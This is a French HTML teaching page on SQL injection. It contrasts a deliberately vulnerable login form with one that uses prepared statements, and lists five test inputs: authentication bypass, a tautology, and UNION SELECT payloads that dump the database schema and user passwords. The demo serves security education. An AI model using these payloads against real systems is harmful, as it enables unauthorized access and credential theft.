<!DOCTYPE html>
<html lang="fr">
    <head>
        <meta charset="utf-8" />
    </head>
    <body>
        <h1>La faille SQLi : SQL injection</h1>
        <p>
            <a href="https://igm.univ-mlv.fr/~dr/XPOSE2011/injections_SQL/exploit.php" target="_blank">Explications de la démo</a>
        </p>
        <p>
            <a href="https://fr.wikipedia.org/wiki/Injection_SQL" target="_blank">Wikipedia</a>
        </p>

        <h2>Requête non protégée</h2>
        <form method="post" action="sqli_vulnerable">
            <label for="">Login : </label><input type="text" name="login" required><br>
            <label for="">Password : </label><textarea name="password" required></textarea><br>
            <input type="submit" value="Login">
        </form>

        <h2>Requête préparée</h2>
        <form method="post" action="sqli_prepared">
            <label for="">Login : </label><input type="text" name="login" required><br>
            <label for="">Password : </label><textarea name="password" required></textarea><br>
            <input type="submit" value="Login">
        </form>

        <h2>Les tests à dérouler</h1>
        <dl>
            <dt>Test 1 : Accès normal</dt>
            <dd>login=(pierre) password=(654321) : les comptes de pierre s'affichent</dd>
            <br>
            <dt>Test 2 : Bypass d'authentification</dt>
            <dd>login=(pierre'#) password=(coucou) : les comptes de pierre s'affichent quand même</dd>
            <br>
            <dt>Test 3 : Injection d'évaluation true</dt>
            <dd>login=(coucou) password=(coucou' OR 1='1) : tous les comptes s'affichent</dd>
            <br>
            <dt>Test 4 : Evasion de la table cible</dt>
            <dd>login=(coucou) password=(blabla' AND 1=0 UNION SELECT database(), t.table_name, concat(c.column_name,':',c.data_type) FROM information_schema.tables AS t NATURAL JOIN information_schema.columns AS c WHERE table_schema = database() # ) : la structure de la base s'affiche</dd>
            <br>
            <dt>Test 5 : Evasion des données d'une table</dt>
            <dd>login=(coucou) password=(blabla' AND 1=0 UNION SELECT login, pass, id FROM users # ) : les users s'affichent avec les passwords</dd>
        </dl>

    </body>
</html>